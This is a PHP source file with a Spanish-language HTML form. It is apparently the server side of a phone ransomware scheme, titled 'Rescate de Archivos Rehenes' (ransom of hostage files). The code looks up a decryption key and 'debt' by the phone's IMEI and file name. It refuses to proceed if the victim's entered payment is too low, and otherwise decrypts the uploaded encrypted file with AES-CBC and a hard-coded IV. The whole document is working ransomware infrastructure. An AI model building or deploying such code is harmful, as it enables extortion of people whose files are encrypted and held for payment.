<?php
	require_once 'db.php';

	function dbg($x){ echo "<pre>" . print_r($x,true) . "</pre>"; }

	function pkcs5_pad ($text){ 
		$blocksize = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
		$pad = $blocksize - (strlen($text) % $blocksize); 
		return $text . str_repeat(chr($pad), $pad); 
	} 

	$iv = pack("C*",127, 0, 127, 15, 0, 14, 101, 0, 127, 0, 127, 15, 0, 14, 101, 0);

	function get_information($filename,$imei){
		$dbh = get_db();
		$sth = $dbh->prepare("SELECT * FROM supersafeapp_ransom WHERE `imei`=? AND `filename`=?");
		$sth->execute(array($imei,$filename));
		$c = $sth->fetch(PDO::FETCH_ASSOC);
		return array(trim($c['key']),$c['sha1'],$c['debt']);
	}
	
	$response = false;
	if(isset($_FILES['filedata'])){
		$file = $_POST['filename'];
		$file = basename($file);

		$imei = $_POST['imei'];
		$pay = $_POST['pay'];
		list($key,$sha1_saved,$debt) = get_information($file,$imei);

		if($debt > $pay){
			$response = "La cantidad de dinero ingresada es insuficiente";	
		}else{
			$filedata = file_get_contents($_FILES['filedata']['tmp_name']);

			if(sha1($filedata) === $sha1_saved){
				$filedata = pkcs5_pad($filedata);

				header("Content-Disposition: attachment; filename='$file'");
				header("Content-Type: application/octet-stream");
				header("Content-Transfer-Encoding: binary");

				$key = base64_decode($key);
				echo mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$key,$filedata,MCRYPT_MODE_CBC,$iv);
				exit(0);
			}else{
				$response = "No ha ingresado el archivo criptografico!!";
			}
		}	
	}
?>
<!DOCTYPE html>
<!-- saved from url=(0040)http://getbootstrap.com/examples/signin/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">

	<title>Recuperador de archivos</title>

	<!-- Bootstrap core CSS -->
	<link href="dist/css/bootstrap.css" rel="stylesheet">

	<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!--[if lt IE 9]>
	  <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
	  <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
	<![endif]-->
	</head>
	<body data-ember-extension="1">
		<?php if ($response !== false): ?>
			<div class="row">
				<div class="col-md-12">
					<div class="alert alert-dismissable alert-danger">
						<button type="button" class="close" data-dismiss="alert">×</button>
						<strong> ERROR: </strong> <?= $response ?>.
					</div>
				</div>
			</div>
		<?php endif ?>
		<div class="row">
		   <div class="col-md-offset-3 col-md-6">
				<h1 class="text-center"> Rescate de Archivos Rehenes </h1> 
		   </div>
	   </div>
		<form class="form-horizontal" role="form" method="post" enctype="multipart/form-data" action="<?php echo $_SERVER["PHP_SELF"]; ?>" >	
			<div class="row well">
				<div class="col-md-offset-3 col-md-6">
					<div class="form-group">
						<label for="Nombre archivo">Nombre archivo original</label>
						<input pattern="^(.*)\.(.*)$" required class="form-control" name="filename" placeholder="Nombre del archivo...">
					</div>
					<div class="form-group">
						<label for="imei">Imei del Telefono</label>
						<input type="number" pattern="\d{15}" class="form-control" name="imei" placeholder="Imei del telefono...">
					</div>
					<div class="form-group">
						<label for="pay"> Pago a realizar:
							<input type="number" required class="form-control input-sm" min="0" max="9999" step="0.01" size="4" name="pay"> 
						</label>
					</div>
					<div class="form-group">
						<label for="file">Archivo cifrado </label>
						<input type="file" required id="file" name="filedata">
					</div>
				</div>		
			</div>
			<div class="row">
				<div class="col-md-offset-3 col-md-6">
					<button type="submit" class="btn btn-primary btn-lg btn-block">
						Enviar
					</button>
				</div>
			</div>
		</form>
	</body>
</html>
